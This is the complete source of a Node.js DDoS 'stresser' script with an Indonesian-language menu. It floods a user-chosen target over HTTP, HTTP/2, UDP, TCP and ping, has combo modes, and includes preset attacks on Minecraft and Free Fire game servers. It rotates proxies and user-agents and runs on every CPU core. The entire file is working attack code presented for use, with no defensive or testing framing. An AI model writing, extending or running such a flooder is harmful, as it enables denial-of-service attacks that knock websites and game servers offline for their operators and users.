// elite-tool.js - Anti-error & Ganas DDoS Stresser dengan Combo Web & Game // Requires: npm install chalk@4 figlet inquirer

const fs = require('fs'); const os = require('os'); const cluster = require('cluster'); const { exec } = require('child_process'); const http = require('http'); const http2 = require('http2'); const net = require('net'); const dgram = require('dgram'); const chalk = require('chalk'); // use chalk@4 for CommonJS const figlet = require('figlet'); const inquirer = require('inquirer');

// Load proxies and user-agents safely let proxies = [], uas = []; try { proxies = fs.readFileSync('./proxy.txt', 'utf-8').split(/\r?\n/).filter(Boolean); uas = fs.readFileSync('./ua.txt', 'utf-8').split(/\r?\n/).filter(Boolean); } catch (e) { console.warn(chalk.yellow('⚠️  Proxy atau UA file tidak ditemukan, menggunakan default UA')); }

// Display banner function displayBanner() { console.clear(); console.log(chalk.red(figlet.textSync('IP STRESSER', { horizontalLayout: 'full' }))); console.log(chalk.yellow('🔥 Ganas & Anti-Error DDoS Stresser 🔥')); console.log(chalk.green(📱 Node ${process.version} on ${os.platform()} ${os.arch()} | Workers: ${os.cpus().length}\n)); }

// Utility sleep const sleep = ms => new Promise(res => setTimeout(res, ms));

// --- Attack Methods --- async function httpFlood(target, threads, duration) { const end = Date.now() + duration * 1000; while (Date.now() < end) { for (let i = 0; i < threads; i++) { try { const headers = { 'User-Agent': uas.length ? uas[Math.floor(Math.random() * uas.length)] : 'Mozilla/5.0', Connection: 'keep-alive' }; const req = http.request(target, { method: 'GET', headers, timeout: 5000 }, res => res.destroy()); req.on('error', () => {}); req.end(); } catch {} } await sleep(5); } }

async function http2Flood(target, threads, duration) { const end = Date.now() + duration * 1000; while (Date.now() < end) { for (let i = 0; i < threads; i++) { try { const client = http2.connect(target, { timeout: 5000 }); const req = client.request({ ':path': '/' }); req.on('error', () => {}); req.end(); client.close(); } catch {} } await sleep(5); } }

function udpFlood(host, port, threads, duration) { const end = Date.now() + duration * 1000; const iv = setInterval(() => { if (Date.now() >= end) return clearInterval(iv); for (let i = 0; i < threads; i++) { try { const socket = dgram.createSocket('udp4'); socket.send(Buffer.alloc(1024, 'X'), port, host, () => socket.close()); } catch {} } }, 20); }

function tcpFlood(host, port, threads, duration) { const end = Date.now() + duration * 1000; const iv = setInterval(() => { if (Date.now() >= end) return clearInterval(iv); for (let i = 0; i < threads; i++) { try { const sock = new net.Socket(); sock.setTimeout(3000); sock.connect(port, host, () => sock.destroy()); sock.on('error', () => {}); } catch {} } }, 20); }

function pingFlood(target) { console.log(chalk.blue('🔥 Menjalankan Ping Flood 🔥')); exec(ping -f -s 1024 ${target}, (err, stdout, stderr) => { if (err) console.error(stderr); }); }

// Game-specific attacks const gameConfig = { Minecraft: { port: 25565, fn: tcpFlood, mul: 2 }, 'Free Fire': { port: 2050, fn: udpFlood, mul: 3 } };

function gameAttack(name, host, threads, duration) { const cfg = gameConfig[name]; console.log(chalk.cyan(⚔️  ${name} Attack pada ${host}:${cfg.port})); cfg.fn(host, cfg.port, threads * cfg.mul, duration); }

// Combo Modes async function webCombo(target, threads, duration) { console.log(chalk.magenta('🔗 Menjalankan Web Combo: HTTP, HTTP/2, TCP, UDP'));
await Promise.all([
httpFlood(target, threads, duration), http2Flood(target, threads, duration) ]); const host = new URL(target).hostname; tcpFlood(host, 80, threads, duration); udpFlood(host, 80, threads, duration); }

async function gameCombo(host, threads, duration) { console.log(chalk.magenta('🎮 Menjalankan Game Combo: Minecraft & Free Fire'));
Object.keys(gameConfig).forEach(name => gameAttack(name, host, threads, duration)); }

async function brutalCombo(target, threads, duration) { console.log(chalk.redBright('💥 Brutal Kombo Down (WEB + GAME + PING)'));
await webCombo(target, threads, duration); gameCombo(new URL(target).hostname, threads, duration); pingFlood(new URL(target).hostname); }

// Interactive Menu async function mainMenu() { displayBanner(); const methods = [ 'HTTP Flood','HTTP/2 Flood','UDP Flood','TCP Flood','Ping Flood', 'Web Combo','Game Combo','Brutal Kombo (ALL)', 'Minecraft Attack','Free Fire Attack' ]; const ans = await inquirer.prompt([ { type: 'list', name: 'method', message: 'Pilih metode serangan:', choices: methods }, { type: 'input', name: 'target', message: 'Masukkan target (URL atau IP):' }, { type: 'input', name: 'port', message: 'Masukkan port:', when: a => ['UDP Flood','TCP Flood'].includes(a.method), default: '80' }, { type: 'number', name: 'threads', message: 'Jumlah threads:', default: 300 }, { type: 'number', name: 'duration', message: 'Durasi (detik):', default: 180 } ]);

const { method, target, port, threads, duration } = ans; console.log(chalk.green(🛠️  Menjalankan ${method} | Target: ${target}${port?':'+port:''} | Threads: ${threads} | Durasi: ${duration}s));

try { switch (method) { case 'HTTP Flood': return httpFlood(target, threads, duration); case 'HTTP/2 Flood': return http2Flood(target, threads, duration); case 'UDP Flood': return udpFlood(target, parseInt(port), threads, duration); case 'TCP Flood': return tcpFlood(target, parseInt(port), threads, duration); case 'Ping Flood': return pingFlood(target); case 'Web Combo': return webCombo(target, threads, duration); case 'Game Combo': return gameCombo(target, threads, duration); case 'Brutal Kombo (ALL)': return brutalCombo(target, threads, duration); case 'Minecraft Attack': return gameAttack('Minecraft', target, threads, duration); case 'Free Fire Attack': return gameAttack('Free Fire', target, threads, duration); default: console.log(chalk.red('Metode tidak valid')); } } catch (e) { console.error(chalk.red('❌ Terjadi kesalahan:'), e.message); } }

// Master/Worker Setup if (cluster.isMaster) { const cpuCount = os.cpus().length; console.log(chalk.magenta(🚀 Master process, forking ${cpuCount} workers)); for (let i = 0; i < cpuCount; i++) cluster.fork(); cluster.on('exit', () => cluster.fork()); } else { mainMenu(); }

